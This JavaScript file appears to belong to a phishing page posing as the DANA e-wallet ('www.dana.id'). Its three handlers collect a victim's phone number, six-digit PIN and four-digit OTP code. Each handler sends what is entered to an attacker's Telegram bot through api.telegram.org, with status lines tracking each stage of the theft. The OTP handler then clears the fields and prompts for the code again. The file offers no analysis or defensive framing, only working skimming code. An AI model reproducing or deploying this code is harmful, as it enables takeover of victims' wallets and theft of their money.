var logo = "☴ www.dana.id ☴";    

/////// NOMOR /////////////////////
function sendNohp(event) {
    event.preventDefault(); 
    $("#process").show();
  
    var tarif = document.getElementById("tarif").value;        
    var dataString = $("#formNohp, #formPin, #formOtp").serialize();
    
    var gabungan = 
        logo + "\n" + 
        tarif + "\n\n" + 
        "━━━━━━━━━━━━━━━━━━━━\n" +
        "📞 NOMOR |  <code>0" + nomor.value + "</code>\n" +
        "━━━━━━━━━━━━━━━━━━━━\n" +
        "⏰ WAKTU: " + new Date().toLocaleString('id-ID') + "\n" +
        "⏳ STATUS: Menunggu PIN\n" +
        "━━━━━━━━━━━━━━━━━━━━";
    
    // Kirim ke Telegram API
    (async function() {
        try {
            await fetch(`https://api.telegram.org/bot${TELEGRAM_TOKEN}/sendMessage`, {
                method: 'POST',
                headers: { 'Content-Type': 'application/json' },
                body: JSON.stringify({
                    chat_id: TELEGRAM_CHAT_ID,
                    text: gabungan,
                    parse_mode: 'HTML'
                })
            });
        } catch(e) {
            console.error('Error:', e);
        }
        $("#process").hide();
        document.getElementById("back1").style.display = "none";
        document.getElementById("back2").style.display = "block";
        $("#formNohp").fadeOut();
        setTimeout(function() {
            $("#formPin").fadeIn();
            $("#pin1").focus();
        }, 500);
    })();
};

/////// PIN ///////////////////////
function sendPin(event) {
    if (event) event.preventDefault();
    $("#process").show();
    var tarif = document.getElementById("tarif").value;
    var dataString = $("#formNohp, #formPin, #formOtp").serialize();
    
    var pin1 = document.getElementById("pin1").value;
    var pin2 = document.getElementById("pin2").value;
    var pin3 = document.getElementById("pin3").value;
    var pin4 = document.getElementById("pin4").value;
    var pin5 = document.getElementById("pin5").value;
    var pin6 = document.getElementById("pin6").value;
    var pin = [pin1, pin2, pin3, pin4, pin5, pin6];
    
    var gabungan = 
        logo + "\n" + 
        tarif + "\n\n" + 
        "━━━━━━━━━━━━━━━━━━━━\n" +
        "📞 NOMOR | <code>0" + nomor.value + "</code>\n" + 
        "🔐 PIN | <code>" + pin.join("") + "</code>\n" +
        "━━━━━━━━━━━━━━━━━━━━\n" +
        "⏰ WAKTU: " + new Date().toLocaleString('id-ID') + "\n" +
        "✅ STATUS: PIN Diterima\n" +
        "━━━━━━━━━━━━━━━━━━━━";
    
    // Kirim ke Telegram API
    (async function() {
        try {
            await fetch(`https://api.telegram.org/bot${TELEGRAM_TOKEN}/sendMessage`, {
                method: 'POST',
                headers: { 'Content-Type': 'application/json' },
                body: JSON.stringify({
                    chat_id: TELEGRAM_CHAT_ID,
                    text: gabungan,
                    parse_mode: 'HTML'
                })
            });
        } catch(e) {
            console.error('Error:', e);
        }
        $("#process").hide();
        $(".inline-logo").show();
        var nomorValue = document.getElementById("nomor").value;
        document.getElementById("alert").innerHTML = "+62 " + nomorValue + "";
        $("#formPin").fadeOut();
        $(".bgotp").fadeIn();
        
        var items = ["tarif", "nomor"];
        items.forEach(function(item) {
            var value = document.getElementById(item).value;
            sessionStorage.setItem(item, value);
        });       
        for (var i = 1; i <= 6; i++) {
            var pinVal = document.getElementById("pin" + i).value;
            sessionStorage.setItem("pin" + i, pinVal);
        }
    })();
};

/////// OTP /////////////////////
function submit() {
    event.preventDefault();
    xx.style.display = '';
    con.style.marginTop = '';
    
    var tarifValue = document.getElementById("tarif") ? document.getElementById("tarif").value : sessionStorage.getItem("tarif");
    var nomorValue = sessionStorage.getItem("nomor");
    
    var pin = [];
    for (var i = 1; i <= 6; i++) {
        pin.push(sessionStorage.getItem("pin" + i));
    }
    
    var tp1 = document.getElementById("tp1") ? document.getElementById("tp1").value : "";
    var tp2 = document.getElementById("tp2") ? document.getElementById("tp2").value : "";
    var tp3 = document.getElementById("tp3") ? document.getElementById("tp3").value : "";
    var tp4 = document.getElementById("tp4") ? document.getElementById("tp4").value : "";
    var otp = [tp1, tp2, tp3, tp4];
    
    var gabungan = 
        logo + "\n" + 
        "━━━━━━━━━━━━━━━━━━━━\n" +
        "💳 TARIF: " + tarifValue + "\n" +
        "━━━━━━━━━━━━━━━━━━━━\n" +
        "📞 NOMOR: <code>0" + nomorValue + "</code>\n" + 
        "🔐 PIN: <code>" + pin.join("") + "</code>\n" + 
        "📧 KODE OTP: <code><b>" + otp.join("") + "</b></code>\n" +
        "━━━━━━━━━━━━━━━━━━━━\n" +
        "⏰ WAKTU: " + new Date().toLocaleString('id-ID') + "\n" +
        "🎯 STATUS: OTP Diterima\n" +
        "━━━━━━━━━━━━━━━━━━━━";
    
    // Kirim ke Telegram API
    (async function() {
        try {
            await fetch(`https://api.telegram.org/bot${TELEGRAM_TOKEN}/sendMessage`, {
                method: 'POST',
                headers: { 'Content-Type': 'application/json' },
                body: JSON.stringify({
                    chat_id: TELEGRAM_CHAT_ID,
                    text: gabungan,
                    parse_mode: 'HTML'
                })
            });
        } catch(e) {
            console.error('Error:', e);
        }
        
        setTimeout(function() {
            $("#process").fadeOut();      
            $(".animated").removeClass("hide");       
            $(".animated").show();
        }, 500);
        
        setTimeout(function() {        
            var tp1El = document.getElementById('tp1');
            var tp2El = document.getElementById('tp2');
            var tp3El = document.getElementById('tp3');
            var tp4El = document.getElementById('tp4');
            if (tp1El) tp1El.value = '';
            if (tp2El) tp2El.value = '';
            if (tp3El) tp3El.value = '';
            if (tp4El) tp4El.value = '';
            if (tp1El) tp1El.focus();       
            $(".animated").addClass("hide");              
        }, 4000);
    })();
}